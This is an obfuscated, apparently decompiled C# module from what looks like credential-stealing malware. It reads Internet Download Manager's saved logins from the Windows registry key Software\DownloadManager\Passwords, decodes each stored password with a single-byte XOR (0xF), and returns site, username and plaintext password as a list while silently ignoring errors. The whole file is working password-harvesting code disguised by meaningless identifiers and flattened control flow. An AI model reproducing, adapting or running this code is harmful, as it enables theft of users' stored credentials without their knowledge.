using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using Microsoft.Win32;
using p3N5Y;

namespace ZAZUx;

public class Fqu2C : MnVCfk
{
	public class Gv26o : SafeHandle
	{
		public override bool xZCZUHoqi => handle == IntPtr.Zero;

		public Gv26o()
			: base(IntPtr.Zero, ownsHandle: true)
		{
		}

		protected override bool ReleaseHandle()
		{
			return oFQ.RegCloseKey(handle) == 0;
		}
	}

	[SuppressUnmanagedCodeSecurity]
	public class oFQ
	{
		[DllImport("Advapi32", CharSet = CharSet.Unicode, SetLastError = true)]
		[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
		public static extern int RegOpenKeyEx([In] IntPtr hKey, [In] string subKey, int options, [In] int samDesired, [In][Out] ref Gv26o phkResult);

		[DllImport("Advapi32", SetLastError = true)]
		[ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
		public static extern int RegCloseKey(IntPtr hKey);

		[DllImport("Advapi32", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern int RegQueryValueEx([In] Gv26o hKey, [In] string lpValueName, int reserved, out int type, [In][Out] byte[] data, [In][Out] ref int dataSize);
	}

	[CompilerGenerated]
	private string Application__BackingField;

	public string rQrpbH
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public Fqu2C()
	{
		rQrpbH = "Internet Downloader Manager";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<ii68> list = default;
		string text = default;
		IntPtr hKey = default;
		do
		{
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			if (num == 2)
			{
				text = "Software\\DownloadManager\\Passwords\\";
				num = 3;
			}
			if (num == 3)
			{
				hKey = new IntPtr(2147483649L);
				num = 4;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 4);
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text);
			if (registryKey.GetSubKeyNames().Length != 0)
			{
				string[] subKeyNames = registryKey.GetSubKeyNames();
				foreach (string text2 in subKeyNames)
				{
					registryKey.OpenSubKey(text2);
					Gv26o phkResult = null;
					oFQ.RegOpenKeyEx(hKey, text + text2, 0, 131097, ref phkResult);
					byte[] array = new byte[257];
					byte[] array2 = new byte[257];
					int type = 0;
					int dataSize = 0;
					oFQ.RegQueryValueEx(phkResult, "User", 0, out type, array, ref dataSize);
					oFQ.RegQueryValueEx(phkResult, "EncPassword", 0, out type, array2, ref dataSize);
					ii68 ii69 = new ii68();
					ii69.byIdLuuGZbL = text2;
					int num2 = 0;
					for (int j = 0; j <= array.Length - 1 && array[j] != 0; j++)
					{
						num2++;
					}
					byte[] array3 = array;
					array = new byte[num2 - 1 + 1];
					if (array3 != null)
					{
						Array.Copy(array3, array, Math.Min(num2, array3.Length));
					}
					ii69.S8v = Encoding.Default.GetString(array);
					num2 = 0;
					string text3 = "";
					for (int k = 0; k <= array2.Length - 1 && array2[k] != 0; k++)
					{
						text3 += (char)(array2[k] ^ 0xF);
					}
					ii69._9H5rP7hg2 = text3;
					ii69.oVAe = rQrpbH;
					list.Add(ii69);
				}
			}
		}
		catch
		{
		}
		return list;
	}
}
